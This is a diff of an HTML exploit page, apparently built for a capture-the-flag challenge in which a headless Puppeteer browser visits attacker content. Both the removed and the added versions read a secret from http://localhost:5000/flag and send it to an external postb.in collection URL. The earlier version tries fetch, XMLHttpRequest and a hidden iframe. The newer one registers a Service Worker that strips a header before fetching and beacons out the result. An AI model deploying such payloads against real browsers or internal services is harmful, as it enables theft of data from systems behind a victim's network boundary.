@@ -1,38 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta http-equiv="Cache-Control" content="max-age=3600">
-</head>
 <body>
 <script>
-  const EXFIL = "https://www.postb.in/1778660481006-3008019395638";
+const EXFIL = "https://www.postb.in/1778660481006-3008019395638";
 
-  // Tentative 1 : fetch direct (contourne extraHTTPHeaders Puppeteer)
-  fetch("http://localhost:5000/flag", { credentials: "omit" })
-    .then(r => r.text())
-    .then(data => fetch(EXFIL + "?method=fetch&flag=" + encodeURIComponent(data)))
-    .catch(e => fetch(EXFIL + "?method=fetch&err=" + encodeURIComponent(e.toString())));
-
-  // Tentative 2 : via XMLHttpRequest
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", "http://localhost:5000/flag", true);
-  xhr.onload = () => fetch(EXFIL + "?method=xhr&flag=" + encodeURIComponent(xhr.responseText));
-  xhr.onerror = (e) => fetch(EXFIL + "?method=xhr&err=" + encodeURIComponent(String(e)));
-  xhr.send();
-
-  // Tentative 3 : iframe (pas de CORS, juste Same-Origin)
-  const iframe = document.createElement("iframe");
-  iframe.src = "http://localhost:5000/flag";
-  iframe.style.display = "none";
-  iframe.onload = function() {
-    try {
-      const content = iframe.contentDocument.body.innerHTML;
-      fetch(EXFIL + "?method=iframe&flag=" + encodeURIComponent(content));
-    } catch(e) {
-      fetch(EXFIL + "?method=iframe&err=" + encodeURIComponent(e.toString()));
+// Enregistre un Service Worker qui retire X-User-Agent
+const swCode = `
+self.addEventListener('fetch', event => {
+  const url = event.request.url;
+  if (url.includes('localhost:5000/flag')) {
+    const newHeaders = new Headers();
+    for (const [key, value] of event.request.headers.entries()) {
+      if (key.toLowerCase() !== 'x-user-agent') {
+        newHeaders.append(key, value);
+      }
     }
-  };
-  document.body.appendChild(iframe);
+    const newRequest = new Request(url, {
+      method: event.request.method,
+      headers: newHeaders,
+      credentials: 'omit'
+    });
+    event.respondWith(fetch(newRequest));
+  }
+});
+`;
+
+const blob = new Blob([swCode], { type: "application/javascript" });
+const swUrl = URL.createObjectURL(blob);
+
+navigator.serviceWorker.register(swUrl, { scope: "/" })
+  .then(() => navigator.serviceWorker.ready)
+  .then(() => {
+    return fetch("http://localhost:5000/flag", { credentials: "omit" });
+  })
+  .then(r => r.text())
+  .then(data => {
+    navigator.sendBeacon(EXFIL + "?flag=" + encodeURIComponent(data));
+  })
+  .catch(e => {
+    navigator.sendBeacon(EXFIL + "?err=" + encodeURIComponent(e.toString()));
+  });
 </script>
 </body>
 </html>
